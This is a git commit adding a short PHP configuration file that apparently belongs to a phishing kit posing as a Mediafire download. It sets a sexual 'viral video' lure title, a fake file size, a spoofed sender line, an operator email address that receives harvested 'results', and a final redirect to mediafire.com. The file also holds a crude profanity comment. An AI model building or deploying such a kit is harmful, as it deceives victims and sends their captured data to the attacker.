5eb3188c16de467bbd0e8c28aa40cc647750086e
Zannbott9728 <130833885+Zannbott9728@users.noreply.github.com>
2024-02-23 23:22:19 +0700

    Mediafire
    Viral

---
+++ mailman.php
@@ -0,0 +1,70 @@
+<?php
+
+$namafile = 'Video Bokep Viral 2024'; //NAMA VIDEO/FILE
+
+$alexhost = 'zannmods@gmail.com'; // EMAIL KAMU
+
+$sender ='From: -•°WEBP BY ZANN CYBER°•- <result@g-code.web.id>'; // NAMA RESS
+
+$ukuran = '11.3MB'; // UKURAN 
+
+
+
+
+//kontol
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//ubah auto eror wkwkwwkkw
+$linkakhir = 'https://www.mediafire.com'; //
+
+?>
